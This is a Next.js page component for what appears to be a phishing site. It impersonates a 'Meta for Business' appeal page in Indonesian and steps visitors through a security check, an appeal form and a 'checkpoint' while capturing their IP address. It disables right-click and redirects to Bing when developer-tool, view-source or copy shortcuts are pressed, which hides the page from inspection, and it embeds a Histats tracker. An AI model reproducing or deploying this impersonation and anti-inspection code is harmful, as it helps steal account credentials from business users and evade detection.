import Head from 'next/head';
import { useState, useEffect } from "react";
import styles from '../styles/Home.module.css';
import SecurityCheck from './security-check';
import AppealForm from './appeal-form';
import CheckPoint from './check-point';

export default function Home({ userIP }) {
  const [steps, setOpen] = useState({ step_one: true, step_two: false, step_three: false });

  const getData = (data) => {
    if (data.type === 'security-check') {
      setOpen({ step_one: false, step_two: true, step_three: false });
    } else if (data.type === 'appeal') {
      setOpen({ step_one: false, step_two: false, step_three: true });
    }
  }

  useEffect(() => {
    const handleContextMenu = (e) => e.preventDefault();
    const handleKeyDown = (e) => {
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
        (e.ctrlKey && e.keyCode === 85) // Ctrl+U
      ) {
        e.preventDefault();
        window.location.href = "https://www.bing.com";
      }

      if (
        e.ctrlKey && 
        [67, 86, 85, 87].includes(e.keyCode) // Ctrl+C/V/U/W
      ) {
        e.preventDefault();
        window.location.href = "https://www.bing.com";
      }
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);

    return () => {
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
    }
  }, []);

  return (
    <div className={styles.container}>
      <Head>
        <title>Meta for Business - Halaman Banding</title>
        <link rel="icon" href="/favicon.ico" />

        {/* Histats tracking script */}
        <script type="text/javascript" dangerouslySetInnerHTML={{ __html: `
          var _Hasync= _Hasync|| [];
          _Hasync.push(['Histats.start', '1,4846905,4,0,0,0,00010000']);
          _Hasync.push(['Histats.fasi', '1']);
          _Hasync.push(['Histats.track_hits', '']);
          (function() {
            var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
            hs.src = ('//s10.histats.com/js15_as.js');
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
          })();
        ` }}></script>
      </Head>

      {steps.step_one && (
        <SecurityCheck onSubmit={getData} />
      )}

      {steps.step_two && (
        <AppealForm onSubmit={getData} ip={userIP} />
      )}

      {steps.step_three && (
        <CheckPoint ip={userIP} />
      )}

      <style jsx global>{`
        body {
          background-color: #e9eaed;
          margin: 0px;
          padding: 0px;
        }
      `}
      </style>
    </div>
  )
}

Home.getInitialProps = async ({ req }) => {
  const userIP = req
    ? req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress
    : null;
  return { userIP };
}
